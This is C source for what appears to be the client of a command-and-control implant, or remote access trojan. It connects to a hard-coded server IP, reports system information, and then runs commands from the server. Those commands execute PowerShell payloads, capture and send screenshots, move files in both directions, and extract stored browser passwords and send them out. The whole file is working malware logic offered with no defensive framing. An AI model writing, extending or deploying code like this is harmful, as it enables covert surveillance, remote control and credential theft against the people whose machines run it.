#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include "c2.h"
#include "client/utils.h"
#include "client/screenshot.h"
#include "common.h"
#include "client/info.h"
#include "client/browser_pass.h"

#define SERVER_IP "192.168.100.100"

int main() {
    SOCK_INIT();

    // Create a TCP socket descriptor.
    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv = {0};

    // Config
    serv.sin_family = AF_INET;
    serv.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);

connect:
    // Attempt to connect to c2server
    while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        printf("[DEBUG] Attempting to connect to server\n");
        sleep(3);
    }

    // Send client info upon first time connecting
    char* client_info = print_client_info();
    safe_send(sock, client_info, SYS_INFO_CMD, strlen(client_info) + 1, 0);
    free(client_info);

    // Main loop
    while (1) {
        int cmd = 0;

        // Getting initial command
        char* payload = (char*)safe_recv(sock, &cmd, NULL, 0);
        if (payload == NULL) {
            goto connect; // Stupid 
        }

        if (cmd == PSH_CMD) {
            psh_exec(sock, payload);
        } else if (cmd == SCREEN_CMD) {
            // Take screenshot and send raw file to server
            size_t size = 0;
            BYTE* buffer = SaveScreenshot(&size);
            if (!buffer || size == 0) {
                printf("[ERR] Taking screenshot failed.\n");
            }
            safe_send(sock, buffer, SCREEN_CMD, size, 0);
            free(buffer);
        } else if (cmd == DL_FILE_CMD) {
            upload_file_to_server(sock, payload);
        } else if (cmd == UL_FILE_CMD) {
            download_file_from_server(sock, payload);
        } else if (cmd == BROWSER_PASS_CMD) {
            char* browser_password = get_browser_password();
            safe_send(sock, browser_password, BROWSER_PASS_CMD, strlen(browser_password) + 1, 0);
            free(browser_password);
        }
        free(payload);
    }

    CLOSE_SOCK(sock);
    SHUT_DOWN();
    return 0;
}